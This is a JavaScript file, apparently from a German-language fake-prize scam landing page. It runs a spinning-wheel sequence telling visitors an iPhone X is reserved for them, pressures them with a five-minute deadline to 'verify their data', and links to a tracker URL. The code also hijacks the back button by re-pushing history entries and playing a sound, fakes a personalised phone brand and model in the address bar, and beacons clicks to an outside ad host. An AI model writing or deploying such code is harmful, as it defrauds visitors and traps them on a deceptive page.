(function() {
  if (typeof navigator !== 'undefined' && typeof navigator.sendBeacon !== 'undefined') {
    function knock() {
      navigator.sendBeacon('//onclklnd.com/801499/1823783/', 'Browser with BeaconAPI Support');
    }
  } else {

    var browser = (function() {
      var ua = navigator.userAgent,
        tem, M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
      if (/trident/i.test(M[1])) {
        tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
        return {
          name: 'IE',
          version: (tem[1] || '')
        };
      }
      if (M[1] === 'Chrome') {
        tem = ua.match(/\bOPR|Edge\/(\d+)/)
        if (tem != null) {
          return {
            name: 'Opera',
            version: tem[1]
          };
        }
      }
      M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
      if ((tem = ua.match(/version\/(\d+)/i)) != null) {
        M.splice(1, 1, tem[1]);
      }
      return {
        name: M[0],
        version: M[1]
      };
    })();

    if (!(
        (browser.name === 'Chrome' && browser.version > 39) ||
        (browser.name === 'Edge') ||
        (browser.name === 'Firefox' && browser.version > 31) ||
        (browser.name === 'Opera' && browser.version > 26)
      )) {
      function sendBeacon(url, data, _settings) {
        var xhr = ('XMLHttpRequest' in window) ? new XMLHttpRequest() : new ActiveXObject('Microsoft.XMLHTTP');
        xhr.open('POST', url, false);
        xhr.withCredentials = true;
        xhr.setRequestHeader('Accept', '*/*');
        if (typeof data === 'string') {
          xhr.setRequestHeader('Content-Type', 'text/plain;charset=UTF-8');
          xhr.responseType = 'text/plain';
        } else if (Object.prototype.toString.call(data) === '[object Blob]') {
          if (data.type) {
            xhr.setRequestHeader('Content-Type', data.type);
          }
        }

        if (typeof _settings === 'object') {
          if (!isNaN(_settings.timeout)) {
            setTimeout(function() {
              if (xhr.readyState !== 4) {
                xhr.abort();
              }
            }, _settings.timeout);;
          }
        }

        xhr.send(data);
        return true;
      }

      function knock() {
        sendBeacon('//onclklnd.com/801499/1823783/', 'Browser without BeaconAPI Support: ' + browser.name + ' ' + browser.version);
      }
    } else {
      function knock() {
        return true;
      }
    }
  }
  var knocked = false;
  document.addEventListener('click', function(e) {
    if (!knocked) {
      if ((e.target.tagName === 'A' && e.target.getAttribute('href') === '[TRACKER_URL]') ||
        e.target.getAttribute('data-href') === '[TRACKER_URL]') {
        knock();
        knocked = true;
      }
    }
  });

})();



/*
auxiliary functions
*/
function addClass(el, className) {
  if (el.classList) {
    el.classList.add(className);
  } else {
    el.className += ' ' + className;
  }
}

function removeClass(el, className) {
  if (el.classList) {
    el.classList.remove(className);
  } else {
    el.className = el.className.replace(new RegExp('(^|\\b)' + className.split(' ').join('|') + '(\\b|$)', 'gi'), ' ');
  }
}
/*
END auxiliary functions
*/

sweetAlert = function ( obj ) {
  function addClass (el, className) {
    if (el.classList) { el.classList.add(className); }
    else { el.className += ' ' + className; }
  }
  function removeClass(el, className) {
    if (el.classList) { el.classList.remove(className); }
    else { el.className = el.className.replace(new RegExp('(^|\\b)' + className.split(' ').join('|') + '(\\b|$)', 'gi'), ' '); }
  }
  function setText (el, string) {
    if (el.textContent !== undefined) { el.textContent = string; }
    else { el.innerText = string; }
  }
  var sweetOverlayHtml = document.querySelector(".sweet-overlay");
  var sweetAlertHtml = document.querySelector(".sweet-alert");
  setText(sweetAlertHtml.querySelector(".FBTITLE b"), obj.title);
  setText(sweetAlertHtml.querySelector("h2"), obj.title);
  setText(sweetAlertHtml.querySelector("p"), obj.text);
  if(typeof obj.type !== "undefined" && obj.type == "success") {
    sweetAlertHtml.querySelector(".sa-custom").style.display = "none";
    sweetAlertHtml.querySelector(".sa-success").style.display = "";
  }
  sweetOverlayHtml.style.display = "";
  sweetAlertHtml.style.display = "";
}
sweetAlert.close = function () {
  var sweetOverlayHtml = document.querySelector(".sweet-overlay");
  var sweetAlertHtml = document.querySelector(".sweet-alert");
  sweetOverlayHtml.style.display = "none";
  sweetAlertHtml.style.display = "none";
}
var spinnerAction = function( text, trackingLink ) {
  var currentStep = 1;
  var prizeHtml = document.getElementById("prize");
  var pagelinkHtml, sweetAlertHtml, sweetOverlayHtml;
  function addEventListener (el, eventName, handler) {
    if (el.addEventListener) {
      el.addEventListener(eventName, handler);
    } else {
      el.attachEvent('on' + eventName, function(){
        handler.call(el);
      });
    }
  }

  function spin3() {
    removeClass(pagelinkHtml, "pagelink_hidden");
    addClass(pagelinkHtml, "pagelink_visible");
  }

  function spin2point5() {
    spin3();
    var spinWin = document.getElementById("spin");
    var prizes = document.querySelector(".prizes");
    addClass(spinWin, "spinAround2");
    addClass(prizes, "spinAround2");
    setTimeout(function() {
      addClass(spinWin, "Op");
    }, 6600);
    setTimeout(function() {
      prizeHtml.style.display = "block";
    }, 7000);
    setTimeout(function() {
      sweetAlert({
        title: text.alert5,
        text: text.alert6,
        type: "success"
      }, spin3);
    }, 8000);
  }

  function spin2() {
    var spinWin = document.getElementById("spin");
    var prizes = document.querySelector(".prizes");
    addClass(spinWin, "spinAround");
    addClass(prizes, "spinAround");
    setTimeout(function() {
      sweetAlert({
        title: text.alert3,
        text: text.alert4,
        type: "success"
      });
    }, 6500);
  }

  sweetAlert({
    title: text.alert1,
    text: text.alert2
  });

  function closeAlert() {
    sweetAlert.close();
    currentStep++;
    switch( currentStep ) {
      case 2: spin2(); break;
      case 3: spin2point5(); break;
    }
  };

  function Ready () {
    pagelinkHtml = document.querySelector("a[rel=\"noreferrer noopener\"]");
    addClass(pagelinkHtml, "pagelink_hidden");
    sweetAlertHtml = document.getElementsByClassName("sweet-alert")[0];
    sweetOverlayHtml = document.getElementsByClassName("sweet-overlay")[0];
    addEventListener(sweetAlertHtml, "click", closeAlert);
    addEventListener(sweetOverlayHtml, "click", closeAlert);
  }
  if (document.readyState != 'loading') {
    Ready();
  } else if (document.addEventListener) {
    document.addEventListener('DOMContentLoaded', Ready);
  } else {
    document.attachEvent('onreadystatechange', function() {
      if (document.readyState != 'loading') {
        Ready();
      }
    });
  }
};

/*
spinner action content
*/
var spin = new spinnerAction({
    alert1: "SIE SIND AUSERWÄHLT WORDEN!",
    alert2: "Sie können möglicherweise eine besondere Belohnung gewinnen! Drücken Sie auf „OK“!",
    alert3: "Viel Glück",
    alert4: "Sie haben (1) Extra-Drehung!",
    alert5: "Herzlichen Glückwunsch!",
    alert6: "iPhone X ist für Sie reserviert! Bitte BEEILEN Sie sich! Sie haben nur 5 Minuten, es einzufordern! Verifizieren Sie Ihre Daten auf der nächsten Seite, um fortzufahren.",
  },
  "[TRACKER_URL]");
/*
END spinner action content
*/


var fakepath = document.URL;

window.history.pushState('index.php', 'gogogo', fakepath);
window.history.pushState('index.php', 'disone', fakepath);

window.addEventListener("popstate", function(e) {
  if (document.URL.indexOf(fakepath) >= 0) {
    window.history.pushState('index.php', 'gogogo', fakepath);
    window.history.pushState('index.php', 'disone', fakepath);
    if (document.getElementById('snd')) {
      document.getElementById('snd').play();
    }
    // alert('Ein Update wird dringend empfohlen!\nAktualisieren Sie bitte oder Android könnte langsam und Ihr Handy beschädigt werden!');
  }
});


(function(w, d) {
  function getCookie(name) {
    var matches = document.cookie.match(new RegExp(
      "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
    ));
    return matches ? decodeURIComponent(matches[1]) : false;
  }

  function setCookie(name, value) {
    // for 30 minutes
    var date = new Date(new Date().getTime() + 60 * 30 * 1000);
    document.cookie = name + "=" + value + "; expires=" + date.toUTCString();
  }

  var ow = w.onload;
  w.onload = function() {
    setTimeout(function() {
      var hrf = "[TRACKER_URL]";

      if (!getCookie('hidePrepop')) {

        setCookie('hidePrepop', 1);

        // alert("Herzlichen Glückwunsch!\n\nSie können die Chance auf eine besondere Belohnung erhalten!");
        var prepopEvent = new Event('prepopFired');
        document.dispatchEvent(prepopEvent);
      }

      if (typeof ow === "function") {
        ow();
      }
    }, 10);
  }
})(window, document);





/*
function from date
*/
function load_date(){
  let t_date = new Date();
  let day = t_date.getDate();
  let month = t_date.getMonth();
  let year = t_date.getFullYear();

  if(day < 10) day = '0' + day;

  let month_name = [
    'January',
    'February',
    'March',
    'April',
    'May',
    'June',
    'July',
    'August',
    'September',
    'October',
    'November',
    'December'
  ]

  document.getElementById('date').innerHTML = month_name[month] + ' ' + day + ', ' + year;
}
/*
END function from date
*/


/*
replise location qs
*/
(function(h, l, d) {
  h.replaceState(null, d.title, "?brand=Asus&model=Zenphone");
})(history, location, document);
/*
END replise location qs
*/


(function () {
  function getURLParameter(name){
    return decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || '');
  }

  var brand = getURLParameter('brand');
  var model = getURLParameter('model');

  document.getElementById('brand').innerHTML = brand;
  document.getElementById('model').innerHTML = model;
})();
